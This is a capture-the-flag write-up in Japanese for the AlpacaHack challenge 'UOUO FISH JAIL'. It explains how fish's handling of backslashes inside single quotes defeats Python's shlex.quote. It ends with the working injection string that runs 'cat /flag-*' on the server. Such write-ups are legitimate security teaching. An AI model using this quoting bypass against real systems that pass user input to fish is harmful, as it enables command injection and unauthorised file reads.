# UOUO FISH JAIL

https://alpacahack.com/daily-bside/challenges/uouo-fish-jail

## 問題の概要

サーバーでは入力された内容を `fish` を shell として `echo` コマンドで表示する Python スクリプトが動いています。

```python
subprocess.run(f"echo {shlex.quote(input("$ echo "))}", shell=True, executable="/usr/bin/fish")
```

flag は `/flag-$(md5sum flag.txt | cut -c-32).txt` に配置されています。

`shlex.quote` を回避してコマンドインジェクションを行うことができれば、flag を読むことができます。

## 解法

`shlex.quote` は Unix shell の引数として安全な文字列を生成するための関数で、特殊文字をエスケープしてくれますが、
POSIX に準拠していない shell での動作は保証されておらず、`subprocess.run` で使用する場合は `shell=False` を指定することが推奨されています。

https://docs.python.org/ja/3/library/shlex.html#shlex.quote

`fish` は POSIX に準拠していないため、`shlex.quote` を回避してコマンドインジェクションが可能です。

検証を簡単にするため、ローカルで `jaily.py` を実行し、stderr を確認しつつコマンドを入力してみました。
`while True` で連続して入力できるように書き換えると検証が楽になります。

`'` や `\` などの文字をいろいろ試してみたところ、fish では `'` で囲まれた文字列内でも `\` を使用してエスケープすることができることがわかりました。`shlex.quote` は `\` をエスケープせず、`'` を `'"'"'` のようにエスケープするため、`\'` の組み合わせで quote の対応を崩すことができます。

| 入力 | コマンド        | bash | fish                    |
| ---- | --------------- | ---- | ----------------------- |
| `'`  | `echo ''"'"''`  | `'`  | `'`                     |
| `\\` | `echo '\\'`     | `\\` | `\`                     |
| `\'` | `echo '\'"'"''` | `\'` | quotes are not balanced |

# 解答に使用した入力

```
\'\';cat /flag-*;echo \'
```

`process.run` で実行されるコマンドは次のようになります。

```bash
echo '\'"'"'\'"'"';cat /flag-*;echo \'"'"''
```

`fish` では次のような3つのコマンドとして解釈されます

| コマンド            | 出力               |
| ------------------- | ------------------ |
| echo '\'"'"'\'"'"'; | `'"'\'"`           |
| cat /flag-\*;       | `Alpaca{REDACTED}` |
| echo \'"'"''        | `''`               |
